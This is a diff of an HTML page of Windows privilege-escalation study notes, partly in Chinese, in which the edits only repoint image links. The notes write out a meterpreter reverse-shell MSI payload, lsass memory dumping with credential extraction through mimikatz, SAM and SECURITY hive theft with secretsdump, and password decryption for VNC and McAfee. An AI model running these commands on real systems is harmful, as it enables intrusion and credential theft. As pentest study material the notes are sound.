-<h5 id="AccessEnum"><a href="#AccessEnum" class="headerlink" title="AccessEnum"></a>AccessEnum</h5><p><img src="https://i.imgur.com/WNkqAEY.png" alt=""></p>
-<p><img src="https://i.imgur.com/eGCx4se.png" alt=""></p>
+<h5 id="AccessEnum"><a href="#AccessEnum" class="headerlink" title="AccessEnum"></a>AccessEnum</h5><p><img src="/img/2020/privilege-escalation-note/WNkqAEY.png" alt=""></p>
+<p><img src="/img/2020/privilege-escalation-note/eGCx4se.png" alt=""></p>
 <h5 id="Powershell-1"><a href="#Powershell-1" class="headerlink" title="Powershell"></a>Powershell</h5><p><code>Get-ChildItem &lt;path or directory&gt; -Recurse | Get-Acl | select Path,Owner,AccessToString,Group | fl</code></p>
 <p>ex.<code>Get-ChildItem &#39;C:\Program Files\File Permissions Service\&#39; -Recurse | Get-Acl | select Path,Owner,AccessToString,Group | fl</code></p>
-<p><img src="https://i.imgur.com/OYmLPaM.png" alt=""></p>
-<h5 id="Powershell-PowerUP"><a href="#Powershell-PowerUP" class="headerlink" title="Powershell(PowerUP)"></a>Powershell(PowerUP)</h5><p><code>Get-ModifiableServiceFile</code><br><img src="https://i.imgur.com/rpmAtAH.png" alt=""></p>
+<p><img src="/img/2020/privilege-escalation-note/OYmLPaM.png" alt=""></p>
+<h5 id="Powershell-PowerUP"><a href="#Powershell-PowerUP" class="headerlink" title="Powershell(PowerUP)"></a>Powershell(PowerUP)</h5><p><code>Get-ModifiableServiceFile</code><br><img src="/img/2020/privilege-escalation-note/rpmAtAH.png" alt=""></p>
 <h4 id="Exploitation-4"><a href="#Exploitation-4" class="headerlink" title="Exploitation"></a>Exploitation</h4><h5 id="Manual-1"><a href="#Manual-1" class="headerlink" title="Manual"></a>Manual</h5><p>rename shell.exe to filepermservice.exe</p>
 <p>and put the file into <code>&quot;C:\Program Files\File Permissions Service\&quot;</code> to replace old file.</p>
-<p>then start the service<br><code>sc start filepermsvc</code><br><img src="https://i.imgur.com/sqkKbOY.png" alt=""></p>
+<p>then start the service<br><code>sc start filepermsvc</code><br><img src="/img/2020/privilege-escalation-note/sqkKbOY.png" alt=""></p>
 <h5 id="Metasploit-3"><a href="#Metasploit-3" class="headerlink" title="Metasploit"></a>Metasploit</h5><p><code>exploit/windows/local/service_permissions</code><br><a target="_blank" rel="noopener" href="https://www.rapid7.com/db/modules/exploit/windows/local/service_permissions">https://www.rapid7.com/db/modules/exploit/windows/local/service_permissions</a></p>
 <h3 id="Name-Pipes"><a href="#Name-Pipes" class="headerlink" title="Name Pipes"></a>Name Pipes</h3><h2 id="Registry-1"><a href="#Registry-1" class="headerlink" title="Registry"></a>Registry</h2><h3 id="AutoRun"><a href="#AutoRun" class="headerlink" title="AutoRun"></a>AutoRun</h3><p><code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code><br><code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</code><br><code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunService</code><br><code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceService</code><br><code>HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run</code><br><code>HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce</code><br><code>HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunService</code><br><code>HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnceService</code></p>
-<h4 id="Detection-5"><a href="#Detection-5" class="headerlink" title="Detection"></a>Detection</h4><h5 id="Powershell-2"><a href="#Powershell-2" class="headerlink" title="Powershell"></a>Powershell</h5><p><code>Get-ItemProperty -Path &lt;registry key&gt;</code> (記得冒號)<br><img src="https://i.imgur.com/fWQcJfp.png" alt=""></p>
-<h5 id="Powershell-PowerUp-3"><a href="#Powershell-PowerUp-3" class="headerlink" title="Powershell(PowerUp)"></a>Powershell(PowerUp)</h5><p><code>Get-ModifiableRegistryAutoRun | fl</code><br><img src="https://i.imgur.com/0vJ34rC.png" alt=""></p>
-<h5 id="reg"><a href="#reg" class="headerlink" title="reg"></a>reg</h5><p><code>reg query &lt;registry key&gt;</code> (注意沒有冒號)<br><img src="https://i.imgur.com/nt2BCPK.png" alt=""></p>
-<h5 id="Autoruns-Sysinternal"><a href="#Autoruns-Sysinternal" class="headerlink" title="Autoruns(Sysinternal)"></a>Autoruns(Sysinternal)</h5><p><img src="https://i.imgur.com/YdoAG76.png" alt=""></p>
-<h5 id="Regedit"><a href="#Regedit" class="headerlink" title="Regedit"></a>Regedit</h5><p><img src="https://i.imgur.com/R5iDWHz.png" alt=""></p>
+<h4 id="Detection-5"><a href="#Detection-5" class="headerlink" title="Detection"></a>Detection</h4><h5 id="Powershell-2"><a href="#Powershell-2" class="headerlink" title="Powershell"></a>Powershell</h5><p><code>Get-ItemProperty -Path &lt;registry key&gt;</code> (記得冒號)<br><img src="/img/2020/privilege-escalation-note/fWQcJfp.png" alt=""></p>
+<h5 id="Powershell-PowerUp-3"><a href="#Powershell-PowerUp-3" class="headerlink" title="Powershell(PowerUp)"></a>Powershell(PowerUp)</h5><p><code>Get-ModifiableRegistryAutoRun | fl</code><br><img src="/img/2020/privilege-escalation-note/0vJ34rC.png" alt=""></p>
+<h5 id="reg"><a href="#reg" class="headerlink" title="reg"></a>reg</h5><p><code>reg query &lt;registry key&gt;</code> (注意沒有冒號)<br><img src="/img/2020/privilege-escalation-note/nt2BCPK.png" alt=""></p>
+<h5 id="Autoruns-Sysinternal"><a href="#Autoruns-Sysinternal" class="headerlink" title="Autoruns(Sysinternal)"></a>Autoruns(Sysinternal)</h5><p><img src="/img/2020/privilege-escalation-note/YdoAG76.png" alt=""></p>
+<h5 id="Regedit"><a href="#Regedit" class="headerlink" title="Regedit"></a>Regedit</h5><p><img src="/img/2020/privilege-escalation-note/R5iDWHz.png" alt=""></p>
 <h4 id="Exploitation-5"><a href="#Exploitation-5" class="headerlink" title="Exploitation"></a>Exploitation</h4><p>需有更改autorun binary的前提(overwrite)<br>如果可覆寫autorun binary, 將檔案改成shell, 等高權限user登入後啟動他就能拿到高權限shell</p>
 <h3 id="AlwaysInstallElevated"><a href="#AlwaysInstallElevated" class="headerlink" title="AlwaysInstallElevated"></a>AlwaysInstallElevated</h3><p><code>You can use the AlwaysInstallElevated policy to install a Windows Installer package with elevated (system) privileges.</code><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">To install a package with elevated (system) privileges, set the AlwaysInstallElevated value to &quot;1&quot; under both of the following registry keys:</span><br><span class="line"></span><br><span class="line">HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer</span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer</span><br><span class="line"></span><br><span class="line">If the AlwaysInstallElevated value is not set to &quot;1&quot; under both of the preceding registry keys, the installer uses elevated privileges to install managed applications and uses the current user&#x27;s privilege level for unmanaged applications.</span><br></pre></td></tr></table></figure></p>
 <p>ref:<br><a target="_blank" rel="noopener" href="https://msdn.microsoft.com/zh-tw/windows/desktop/aa367561">https://msdn.microsoft.com/zh-tw/windows/desktop/aa367561</a></p>
 <p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated">https://docs.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated</a></p>
 <p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-tw/dotnet/standard/managed-code">https://docs.microsoft.com/zh-tw/dotnet/standard/managed-code</a></p>
-<h4 id="Detection-6"><a href="#Detection-6" class="headerlink" title="Detection"></a>Detection</h4><h5 id="Powershell-3"><a href="#Powershell-3" class="headerlink" title="Powershell"></a>Powershell</h5><p><code>Get-ItemProperty -Path &lt;registry key&gt;</code> (記得冒號)<br><img src="https://i.imgur.com/POjHcA7.png" alt=""></p>
-<h5 id="Powershell-PowerUp-4"><a href="#Powershell-PowerUp-4" class="headerlink" title="Powershell(PowerUp)"></a>Powershell(PowerUp)</h5><p>Get-RegistryAlwaysInstallElevated<br><img src="https://i.imgur.com/z7eJvbl.png" alt=""></p>
-<h5 id="reg-1"><a href="#reg-1" class="headerlink" title="reg"></a>reg</h5><p><code>reg query &lt;registry key&gt;</code> (注意沒有冒號)<br><img src="https://i.imgur.com/0Z7Zgr6.png" alt=""></p>
+<h4 id="Detection-6"><a href="#Detection-6" class="headerlink" title="Detection"></a>Detection</h4><h5 id="Powershell-3"><a href="#Powershell-3" class="headerlink" title="Powershell"></a>Powershell</h5><p><code>Get-ItemProperty -Path &lt;registry key&gt;</code> (記得冒號)<br><img src="/img/2020/privilege-escalation-note/POjHcA7.png" alt=""></p>
+<h5 id="Powershell-PowerUp-4"><a href="#Powershell-PowerUp-4" class="headerlink" title="Powershell(PowerUp)"></a>Powershell(PowerUp)</h5><p>Get-RegistryAlwaysInstallElevated<br><img src="/img/2020/privilege-escalation-note/z7eJvbl.png" alt=""></p>
+<h5 id="reg-1"><a href="#reg-1" class="headerlink" title="reg"></a>reg</h5><p><code>reg query &lt;registry key&gt;</code> (注意沒有冒號)<br><img src="/img/2020/privilege-escalation-note/0Z7Zgr6.png" alt=""></p>
 <h5 id="Metasploit-4"><a href="#Metasploit-4" class="headerlink" title="Metasploit"></a>Metasploit</h5><p><code>exploit/windows/local/always_install_elevated</code><br><a target="_blank" rel="noopener" href="https://www.rapid7.com/db/modules/exploit/windows/local/always_install_elevated">https://www.rapid7.com/db/modules/exploit/windows/local/always_install_elevated</a></p>
-<h5 id="Regedit-1"><a href="#Regedit-1" class="headerlink" title="Regedit"></a>Regedit</h5><p><img src="https://i.imgur.com/IEu14i9.png" alt=""></p>
+<h5 id="Regedit-1"><a href="#Regedit-1" class="headerlink" title="Regedit"></a>Regedit</h5><p><img src="/img/2020/privilege-escalation-note/IEu14i9.png" alt=""></p>
 <h4 id="Exploitation-6"><a href="#Exploitation-6" class="headerlink" title="Exploitation"></a>Exploitation</h4><h5 id="Advanced-Installer"><a href="#Advanced-Installer" class="headerlink" title="Advanced Installer"></a>Advanced Installer</h5><p><img src="https://www.greyhathacker.net/images/installer.jpg" alt=""></p>
-<h5 id="Powershell-PowerUp-5"><a href="#Powershell-PowerUp-5" class="headerlink" title="Powershell(PowerUp)"></a>Powershell(PowerUp)</h5><p><code>Write-UserAddMSI</code><br><img src="https://i.imgur.com/XWJvyhK.png" alt=""></p>
-<p><img src="https://i.imgur.com/V4ZNczf.png" alt=""></p>
+<h5 id="Powershell-PowerUp-5"><a href="#Powershell-PowerUp-5" class="headerlink" title="Powershell(PowerUp)"></a>Powershell(PowerUp)</h5><p><code>Write-UserAddMSI</code><br><img src="/img/2020/privilege-escalation-note/XWJvyhK.png" alt=""></p>
+<p><img src="/img/2020/privilege-escalation-note/V4ZNczf.png" alt=""></p>
 <h5 id="Metasploit-5"><a href="#Metasploit-5" class="headerlink" title="Metasploit"></a>Metasploit</h5><p><code>exploit/windows/local/always_install_elevated</code><br><a target="_blank" rel="noopener" href="https://www.rapid7.com/db/modules/exploit/windows/local/always_install_elevated">https://www.rapid7.com/db/modules/exploit/windows/local/always_install_elevated</a></p>
 <h5 id="msiexec"><a href="#msiexec" class="headerlink" title="msiexec"></a>msiexec</h5><p><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=[ip] lport=[port] -f msi -o alwe.msi</code></p>
 <p><code>msiexec /quiet /qn /i alwe.msi</code></p>
@@ -370,44 +370,44 @@ Detection (Get HotFix information)powershell">
 <li>Write the running process (lsass.exe) memory space to a file.</li>
 <li>Search for meaningful data.<br>(example is use strings &amp; grpe to search)</li>
 </ol>
-<h5 id="Taskmgr"><a href="#Taskmgr" class="headerlink" title="Taskmgr"></a>Taskmgr</h5><p><img src="https://i.imgur.com/f4kIvAj.png" alt=""></p>
-<h5 id="Powershell-PowerSploit-Exfiltration-Out-Minidump-ps1"><a href="#Powershell-PowerSploit-Exfiltration-Out-Minidump-ps1" class="headerlink" title="Powershell (PowerSploit/Exfiltration/Out-Minidump.ps1)"></a>Powershell (PowerSploit/Exfiltration/Out-Minidump.ps1)</h5><p>pid可以透過ps (powershell)、Get-Process (powershell) 或是tasklist(cmd)指令取得<br><img src="https://i.imgur.com/Ibi0RWj.png" alt=""></p>
-<p><img src="https://i.imgur.com/ivvBsIw.png" alt=""><br>dump lsass<br><code>powershell.exe -exec bypass &quot;. .\Out-Minidump.ps1; Out-minidump (Get-process lsass)&quot;</code> (need admin)<br><img src="https://i.imgur.com/wM3BtAg.png" alt=""><br>dump 出來後可以用 mimikatz 進行解密，建議在哪台電腦 dump 的就在哪台電腦解<br><code>&quot;sekurlsa::minidump .\lsass_472.dmp&quot; &quot;sekurlsa::logonPasswords&quot;&#39;</code><br><img src="https://i.imgur.com/aNTDpLB.png" alt=""><br><code>mimikatz.exe</code> 也是差不多方法</p>
-<h5 id="Powershell-rundll32"><a href="#Powershell-rundll32" class="headerlink" title="Powershell (rundll32)"></a>Powershell (rundll32)</h5><p><code>C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full</code> (need admin)<br><img src="https://i.imgur.com/Au3fVtX.png" alt=""></p>
-<p>一樣用 mimikatz 解密<br><img src="https://i.imgur.com/WfR6WGd.png" alt=""></p>
-<p>推薦使用 powershell, cmd預設會需要開啟 <code>SeDebugPrivilege</code>, 這個在 Powershell 裡面是預設開啟的<br><img src="https://i.imgur.com/4TZvP3z.png" alt=""></p>
-<p><img src="https://i.imgur.com/YEDAdJT.png" alt=""></p>
-<h5 id="Powershell-mimikatz"><a href="#Powershell-mimikatz" class="headerlink" title="Powershell (mimikatz)"></a>Powershell (mimikatz)</h5><p><code>powershell -exec bypass &quot;import-module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz&quot;</code> (need admin)<br><img src="https://i.imgur.com/Z9seOi7.png" alt=""></p>
-<h5 id="ProcDump"><a href="#ProcDump" class="headerlink" title="ProcDump"></a>ProcDump</h5><p><code>procdump.exe -accepteula -ma &lt;pid&gt;</code><br><img src="https://i.imgur.com/BMXyDl1.png" alt=""><br>dump lsass<br><code>procdump.exe -accepteula -ma lsass</code> (need admin)<br><img src="https://i.imgur.com/iiDzA56.png" alt=""></p>
+<h5 id="Taskmgr"><a href="#Taskmgr" class="headerlink" title="Taskmgr"></a>Taskmgr</h5><p><img src="/img/2020/privilege-escalation-note/f4kIvAj.png" alt=""></p>
+<h5 id="Powershell-PowerSploit-Exfiltration-Out-Minidump-ps1"><a href="#Powershell-PowerSploit-Exfiltration-Out-Minidump-ps1" class="headerlink" title="Powershell (PowerSploit/Exfiltration/Out-Minidump.ps1)"></a>Powershell (PowerSploit/Exfiltration/Out-Minidump.ps1)</h5><p>pid可以透過ps (powershell)、Get-Process (powershell) 或是tasklist(cmd)指令取得<br><img src="/img/2020/privilege-escalation-note/Ibi0RWj.png" alt=""></p>
+<p><img src="/img/2020/privilege-escalation-note/ivvBsIw.png" alt=""><br>dump lsass<br><code>powershell.exe -exec bypass &quot;. .\Out-Minidump.ps1; Out-minidump (Get-process lsass)&quot;</code> (need admin)<br><img src="/img/2020/privilege-escalation-note/wM3BtAg.png" alt=""><br>dump 出來後可以用 mimikatz 進行解密，建議在哪台電腦 dump 的就在哪台電腦解<br><code>&quot;sekurlsa::minidump .\lsass_472.dmp&quot; &quot;sekurlsa::logonPasswords&quot;&#39;</code><br><img src="/img/2020/privilege-escalation-note/aNTDpLB.png" alt=""><br><code>mimikatz.exe</code> 也是差不多方法</p>
+<h5 id="Powershell-rundll32"><a href="#Powershell-rundll32" class="headerlink" title="Powershell (rundll32)"></a>Powershell (rundll32)</h5><p><code>C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full</code> (need admin)<br><img src="/img/2020/privilege-escalation-note/Au3fVtX.png" alt=""></p>
+<p>一樣用 mimikatz 解密<br><img src="/img/2020/privilege-escalation-note/WfR6WGd.png" alt=""></p>
+<p>推薦使用 powershell, cmd預設會需要開啟 <code>SeDebugPrivilege</code>, 這個在 Powershell 裡面是預設開啟的<br><img src="/img/2020/privilege-escalation-note/4TZvP3z.png" alt=""></p>
+<p><img src="/img/2020/privilege-escalation-note/YEDAdJT.png" alt=""></p>
+<h5 id="Powershell-mimikatz"><a href="#Powershell-mimikatz" class="headerlink" title="Powershell (mimikatz)"></a>Powershell (mimikatz)</h5><p><code>powershell -exec bypass &quot;import-module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz&quot;</code> (need admin)<br><img src="/img/2020/privilege-escalation-note/Z9seOi7.png" alt=""></p>
+<h5 id="ProcDump"><a href="#ProcDump" class="headerlink" title="ProcDump"></a>ProcDump</h5><p><code>procdump.exe -accepteula -ma &lt;pid&gt;</code><br><img src="/img/2020/privilege-escalation-note/BMXyDl1.png" alt=""><br>dump lsass<br><code>procdump.exe -accepteula -ma lsass</code> (need admin)<br><img src="/img/2020/privilege-escalation-note/iiDzA56.png" alt=""></p>
 <h3 id="Registry-2"><a href="#Registry-2" class="headerlink" title="Registry"></a>Registry</h3><p>AutoLogin can be setup via:</p>
 <ol>
 <li>Group Policy Preference</li>
 <li>Netplwiz.exe</li>
-<li>Editing registry<br><code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</code><br><img src="https://i.imgur.com/KkmCFRo.png" alt=""></li>
+<li>Editing registry<br><code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</code><br><img src="/img/2020/privilege-escalation-note/KkmCFRo.png" alt=""></li>
 </ol>
 <ul>
-<li><p>Putty<br><code>HKCU\Software\SimonTatham\PuTTY\Sessions</code><br><img src="https://i.imgur.com/mLixi5U.png" alt=""></p>
+<li><p>Putty<br><code>HKCU\Software\SimonTatham\PuTTY\Sessions</code><br><img src="/img/2020/privilege-escalation-note/mLixi5U.png" alt=""></p>
 </li>
-<li><p>VNC<br>location is dependping on product.<br>Tight VNC<br><code>HKCU\Software\TightVNC\Server</code><br><img src="https://i.imgur.com/wsrzpA0.png" alt=""></p>
+<li><p>VNC<br>location is dependping on product.<br>Tight VNC<br><code>HKCU\Software\TightVNC\Server</code><br><img src="/img/2020/privilege-escalation-note/wsrzpA0.png" alt=""></p>
 </li>
 </ul>
-<h4 id="Detection-7"><a href="#Detection-7" class="headerlink" title="Detection"></a>Detection</h4><h5 id="Powershell-4"><a href="#Powershell-4" class="headerlink" title="Powershell"></a>Powershell</h5><p><code>Get-ItemProperty &lt;reg key&gt;</code><br><img src="https://i.imgur.com/dFZtXmV.png" alt=""></p>
+<h4 id="Detection-7"><a href="#Detection-7" class="headerlink" title="Detection"></a>Detection</h4><h5 id="Powershell-4"><a href="#Powershell-4" class="headerlink" title="Powershell"></a>Powershell</h5><p><code>Get-ItemProperty &lt;reg key&gt;</code><br><img src="/img/2020/privilege-escalation-note/dFZtXmV.png" alt=""></p>
 <p><code>Get-ItemProperty</code></p>
-<h5 id="cmd-4"><a href="#cmd-4" class="headerlink" title="cmd"></a>cmd</h5><p><code>reg query &lt;reg key&gt;</code><br><img src="https://i.imgur.com/gD1t4C0.png" alt=""><br><code>reg save HKLM\SYSTEM system.hiv</code><br><code>reg save HKLM\SAM sam.hiv</code><br><code>reg save HKLM\security security.hiv</code><br><img src="https://i.imgur.com/FiHjcqt.png" alt=""><br><code>&quot;lsadump::sam /system:system.hiv /sam:sam.hiv&quot;</code><br><img src="https://i.imgur.com/1eb224G.png" alt=""><br><code>secretsdump.py -sam sam.hiv -security security.hiv -system system.hiv LOCAL</code><br><img src="https://i.imgur.com/Gbe3jYS.png" alt=""></p>
+<h5 id="cmd-4"><a href="#cmd-4" class="headerlink" title="cmd"></a>cmd</h5><p><code>reg query &lt;reg key&gt;</code><br><img src="/img/2020/privilege-escalation-note/gD1t4C0.png" alt=""><br><code>reg save HKLM\SYSTEM system.hiv</code><br><code>reg save HKLM\SAM sam.hiv</code><br><code>reg save HKLM\security security.hiv</code><br><img src="/img/2020/privilege-escalation-note/FiHjcqt.png" alt=""><br><code>&quot;lsadump::sam /system:system.hiv /sam:sam.hiv&quot;</code><br><img src="/img/2020/privilege-escalation-note/1eb224G.png" alt=""><br><code>secretsdump.py -sam sam.hiv -security security.hiv -system system.hiv LOCAL</code><br><img src="/img/2020/privilege-escalation-note/Gbe3jYS.png" alt=""></p>
 <h4 id="Exploitation-8"><a href="#Exploitation-8" class="headerlink" title="Exploitation"></a>Exploitation</h4><ul>
 <li>VNC</li>
 </ul>
 <p>Decrypt password with：<br>Cain<br><a target="_blank" rel="noopener" href="http://networkhwsw.blogspot.com/2015/08/cain-vnc.html">http://networkhwsw.blogspot.com/2015/08/cain-vnc.html</a></p>
-<p><code>vncpwd.exe &lt;encrypt password&gt;</code><br><img src="https://i.imgur.com/wsrzpA0.png" alt=""></p>
-<p><img src="https://i.imgur.com/IGVN5jp.png" alt=""></p>
-<p><img src="https://i.imgur.com/cBYoi5q.png" alt=""></p>
+<p><code>vncpwd.exe &lt;encrypt password&gt;</code><br><img src="/img/2020/privilege-escalation-note/wsrzpA0.png" alt=""></p>
+<p><img src="/img/2020/privilege-escalation-note/IGVN5jp.png" alt=""></p>
+<p><img src="/img/2020/privilege-escalation-note/cBYoi5q.png" alt=""></p>
 <ul>
 <li>Auto login<h5 id="Powershell-PowerUp-ps1"><a href="#Powershell-PowerUp-ps1" class="headerlink" title="Powershell (PowerUp.ps1)"></a>Powershell (PowerUp.ps1)</h5></li>
 </ul>
-<p><code>Get-RegistryAutoLogon</code><br><img src="https://i.imgur.com/Ne6fkyf.png" alt=""></p>
+<p><code>Get-RegistryAutoLogon</code><br><img src="/img/2020/privilege-escalation-note/Ne6fkyf.png" alt=""></p>
 <h5 id="Metasploit-6"><a href="#Metasploit-6" class="headerlink" title="Metasploit"></a>Metasploit</h5><p><code>post/windows/gather/credentials/windows_autologin</code><br><a target="_blank" rel="noopener" href="https://www.rapid7.com/db/modules/post/windows/gather/credentials/windows_autologin">https://www.rapid7.com/db/modules/post/windows/gather/credentials/windows_autologin</a></p>
 <p><a target="_blank" rel="noopener" href="https://github.com/pwnieexpress/metasploit-framework/blob/master/modules/post/windows/gather/credentials/windows_autologin.rb">https://github.com/pwnieexpress/metasploit-framework/blob/master/modules/post/windows/gather/credentials/windows_autologin.rb</a></p>
-<h5 id="cmd-General-Search"><a href="#cmd-General-Search" class="headerlink" title="cmd (General Search)"></a>cmd (General Search)</h5><p><code>reg query HKLM /f passw /t REG_SZ /s</code><br><code>reg query HKCU /f passw /t REG_SZ /s</code><br><img src="https://i.imgur.com/HuJeWyU.png" alt=""></p>
+<h5 id="cmd-General-Search"><a href="#cmd-General-Search" class="headerlink" title="cmd (General Search)"></a>cmd (General Search)</h5><p><code>reg query HKLM /f passw /t REG_SZ /s</code><br><code>reg query HKCU /f passw /t REG_SZ /s</code><br><img src="/img/2020/privilege-escalation-note/HuJeWyU.png" alt=""></p>
 <h3 id="Configuration-file"><a href="#Configuration-file" class="headerlink" title="Configuration file"></a>Configuration file</h3><h4 id="Unattend-Windows-Setup"><a href="#Unattend-Windows-Setup" class="headerlink" title="Unattend Windows Setup"></a>Unattend Windows Setup</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Windows Setup works with an unattended installation answer file to automate online  installations and customizations of Windows.  </span><br><span class="line">This method is useful for large-scale rollouts  and for achieving consistency and precision in  the configuration of each computer.</span><br></pre></td></tr></table></figure>
 <p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-vista/cc749415(v=ws.10)">https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-vista/cc749415(v=ws.10)</a></p>
 <p>Depending on OS version, the file is stored in different location and named differently</p>
@@ -419,41 +419,41 @@ Detection (Get HotFix information)powershell">
 <p>%WINDIR%\Panther\Unattend<br>%WINDIR%\Panther<br>%WINDIR%\System32\Sysprep</p>
 </blockquote>
 <h5 id="Unattend-xml"><a href="#Unattend-xml" class="headerlink" title="Unattend.xml"></a>Unattend.xml</h5><p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-tw/windows-hardware/manufacture/desktop/update-windows-settings-and-scripts-create-your-own-answer-file-sxs">https://docs.microsoft.com/zh-tw/windows-hardware/manufacture/desktop/update-windows-settings-and-scripts-create-your-own-answer-file-sxs</a></p>
-<p><img src="https://i.imgur.com/Cj0OMjX.png" alt=""></p>
-<p><img src="https://i.imgur.com/GyApRAA.png" alt=""></p>
+<p><img src="/img/2020/privilege-escalation-note/Cj0OMjX.png" alt=""></p>
+<p><img src="/img/2020/privilege-escalation-note/GyApRAA.png" alt=""></p>
 <h5 id="SiteList-xml"><a href="#SiteList-xml" class="headerlink" title="SiteList.xml"></a>SiteList.xml</h5><ul>
 <li>Used by McAfee Security agent for managing software update.</li>
 <li>Locate at <code>C:\ProgramData\McAfee\Common Framework\SiteList.xml</code></li>
 <li>The config file include encrypt credentials</li>
 <li>Default encrypt is XOR + 3DES</li>
-<li>Can be decrypt by <code>mcafee_sitelist_pwd_decrypt.py</code>(老工具，問題多，不建議用) or <code>Get-DecryptedSitelistPassword.ps1</code><br><img src="https://i.imgur.com/q9RRgSh.png" alt=""><br><code>. .\Get-DecryptedSitelistPassword.ps1; Get-DecryptedSitelistPassword -B64Pass &#39;MQCBNesmh4xsoov8E4KA/i9ukpwRoD3RDId9bU+InCJ/abAFPM9B3Q==&#39;</code><br><img src="https://i.imgur.com/LnyfKqp.png" alt=""></li>
+<li>Can be decrypt by <code>mcafee_sitelist_pwd_decrypt.py</code>(老工具，問題多，不建議用) or <code>Get-DecryptedSitelistPassword.ps1</code><br><img src="/img/2020/privilege-escalation-note/q9RRgSh.png" alt=""><br><code>. .\Get-DecryptedSitelistPassword.ps1; Get-DecryptedSitelistPassword -B64Pass &#39;MQCBNesmh4xsoov8E4KA/i9ukpwRoD3RDId9bU+InCJ/abAFPM9B3Q==&#39;</code><br><img src="/img/2020/privilege-escalation-note/LnyfKqp.png" alt=""></li>
 </ul>
 <h5 id="Web-config"><a href="#Web-config" class="headerlink" title="Web.config"></a>Web.config</h5><p>Powershell (PowerUp.ps1)<br><code>Get-WebConfig</code></p>
-<h5 id="vnc-ini"><a href="#vnc-ini" class="headerlink" title="vnc.ini"></a>vnc.ini</h5><p><code>vncpwd.exe &lt;encrypt password&gt;</code><br><img src="https://i.imgur.com/a0yKBTK.png" alt=""><br><img src="https://i.imgur.com/usVXJW7.png" alt=""></p>
+<h5 id="vnc-ini"><a href="#vnc-ini" class="headerlink" title="vnc.ini"></a>vnc.ini</h5><p><code>vncpwd.exe &lt;encrypt password&gt;</code><br><img src="/img/2020/privilege-escalation-note/a0yKBTK.png" alt=""><br><img src="/img/2020/privilege-escalation-note/usVXJW7.png" alt=""></p>
 <h5 id="cmd-General-Search-1"><a href="#cmd-General-Search-1" class="headerlink" title="cmd (General Search)"></a>cmd (General Search)</h5><p><code>findstr /si pass *.txt *.xml *.ini *.vbs *.cmd *.ps1 *.bat *.inf *.eml</code></p>
 <h2 id="Scheduled-Tasks"><a href="#Scheduled-Tasks" class="headerlink" title="Scheduled Tasks"></a>Scheduled Tasks</h2><h3 id="Binary-overwrite-Missing-Binary"><a href="#Binary-overwrite-Missing-Binary" class="headerlink" title="Binary overwrite (Missing Binary)"></a>Binary overwrite (Missing Binary)</h3><p>not effected by unquote path</p>
-<h4 id="Detection-8"><a href="#Detection-8" class="headerlink" title="Detection"></a>Detection</h4><h5 id="taskched-msc"><a href="#taskched-msc" class="headerlink" title="taskched.msc"></a>taskched.msc</h5><p><img src="https://i.imgur.com/hdpoMtd.png" alt=""></p>
-<h5 id="Powershell-5"><a href="#Powershell-5" class="headerlink" title="Powershell"></a>Powershell</h5><p><code>$schdule=new-object -com(&#39;Schedule.Service&#39;); $schdule.connect(); $tasks=$schdule.getfolder(&#39;\&#39;).gettasks(0); $tasks | fl</code><br><img src="https://i.imgur.com/JTNQBOK.png" alt=""></p>
-<h5 id="Powershell-PowerUp-6"><a href="#Powershell-PowerUp-6" class="headerlink" title="Powershell (PowerUp)"></a>Powershell (PowerUp)</h5><p><code>Get-ModifiableScheduledTaskFile</code> (| select )<br><img src="https://i.imgur.com/h7uNhOi.png" alt=""></p>
-<h5 id="cmd-5"><a href="#cmd-5" class="headerlink" title="cmd"></a>cmd</h5><p><code>schtasks /query /TN &lt;task name&gt; /xml</code><br><img src="https://i.imgur.com/oF9kRWh.png" alt=""></p>
-<p><img src="https://i.imgur.com/pMOZDpG.png" alt=""></p>
-<h5 id="autoruns-sysinternals"><a href="#autoruns-sysinternals" class="headerlink" title="autoruns (sysinternals)"></a>autoruns (sysinternals)</h5><p><img src="https://i.imgur.com/bcO80eV.png" alt=""></p>
+<h4 id="Detection-8"><a href="#Detection-8" class="headerlink" title="Detection"></a>Detection</h4><h5 id="taskched-msc"><a href="#taskched-msc" class="headerlink" title="taskched.msc"></a>taskched.msc</h5><p><img src="/img/2020/privilege-escalation-note/hdpoMtd.png" alt=""></p>
